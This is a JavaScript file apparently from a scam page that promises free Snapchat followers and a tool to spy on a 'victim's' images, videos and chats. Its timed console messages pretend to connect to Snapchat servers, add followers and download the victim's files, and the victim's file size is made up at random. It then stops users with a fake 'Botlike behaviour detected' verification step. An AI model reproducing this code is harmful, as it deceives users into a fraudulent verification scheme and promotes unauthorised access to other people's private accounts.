function SNAPS() {
    $(".S1").fadeOut(1000, function() {
        $(".SNAPS").fadeIn(1000);
    })
}

function FOLLOWERS() {
    $(".S1").fadeOut(1000, function() {
        $(".FOLLOWERS").fadeIn(1000);
    })
}

var PL;
var USERNAME;

function PLATFORM(xD) {
    $(".PL").addClass("duration-500");
    $(".PL").not(xD).removeClass("opacity-50").addClass("opacity-25");
    $(xD).removeClass("opacity-50").removeClass("opacity-25")
    PL = xD;
}

var FL = 10000;

var slider = document.getElementById("SF");

noUiSlider.create(slider, {
    start: 10000,
    step: 5000,
    range: {
        "min": 5000,
        "max": 50000
    }
});

slider.noUiSlider.on("update", function (values, handle) {
    
    FL = Math.round(values[handle]);
    $("#SFa").html("Add <strong>" + Math.round(values[handle]) + "</strong> Followers");

});

var xD1 = true;

var xD2 = true;

var VICTIM;

const options = {
      useEasing: false,
      useGrouping: false,
      separator: '',
      decimal: '',
    };

function CONTINUE(Dx) {

    if (Dx == "Followers-1") {

        USERNAME = $("#USER").val();

        if (!USERNAME || !PL) {

            alert("Type in your Snapchat username and select your platform.");

        } else {

            $("#SNAPIMG").attr("src","https://app.snapchat.com/web/deeplink/snapcode?username=" + USERNAME + "&type=SVG");

            $(".FOLLOWERS").fadeOut(1000, function() {
                $(".FOLLOWERS-2").fadeIn(1000);
            });

        }

    } else if (Dx == "Followers-2") {

        $(".FOLLOWERS-2").fadeOut(1000, function() {
            $(".FOLLOWERS-3").fadeIn(1000);

            if (xD1) {

                xD1 = false;

                $("#CONSOLE-FOLLOWERS").text("Connecting to Snapchat servers...")

                setTimeout(function() {
                    $("#CONSOLE-FOLLOWERS").html("Looking for <strong>" + USERNAME + "</strong> user...")
                }, 2000)

                setTimeout(function() {

                    $("#CONSOLE-FOLLOWERS").html("Adding <strong><span id='FL'>0</span></strong> followers for <strong>" + USERNAME + "</strong> user...")

                    var FOL = new CountUp("FL", 0, FL, 0, 10, options);
                    FOL.start(function() {

                        setTimeout(function() {

                            $("#CONSOLE-FOLLOWERS").html("<strong><span class='text-red-600'>Botlike behaviour detected.</span></strong> Complete verification to receive your <strong>" + FL + " Snapchat followers</strong>.")

                            setTimeout(function() {
                                $("#FV").fadeIn(1000);
                            }, 2000)

                        }, 2000)

                    });
            
                }, 4000)

            }

        });

    } else if (Dx == "Spy-1") {

        VICTIM = $("#VICTIM").val();

        if (VICTIM) {

            $(".SNAPS").fadeOut(1000, function() {
                $(".SNAPS-2").fadeIn(1000, function() {

                    if (xD2) {
                        
                        xD2 = false;

                        $("#CONSOLE-SNAPS").text("Connecting to Snapchat servers...")

                        setTimeout(function() {
                            $("#CONSOLE-SNAPS").html("Looking for <strong>" + VICTIM + "</strong> Snapchat data...")
                        }, 2000)

                        setTimeout(function() {
                            $("#CONSOLE-SNAPS").html("Downloading <strong>" + VICTIM + "</strong> files...")
                        }, 4000)

                        setTimeout(function() {
                            $("#CONSOLE-SNAPS").html("Packing <strong>" + VICTIM + "</strong> images, videos and chats...")
                        }, 6000)

                        $("#VICTIMIMG").attr("src","https://app.snapchat.com/web/deeplink/snapcode?username=" + VICTIM + "&type=SVG");

                        $("#VICTIMNAME").text(VICTIM);

                        $("#VICTIMSIZE").text((Math.floor(Math.random() * 384) + 128) + " MB");
                        
                        $("#VICTIMDATE").text(new Date().toLocaleDateString());

                        setTimeout(function() {
                            $(".SNAPS-2").fadeOut(1000, function() {
                                $(".SNAPS-3").fadeIn(1000);
                            })
                        }, 8000)

                    }

                });
            });

        } else {
            alert("Type your victim Snapchat username.")
        }

    }

}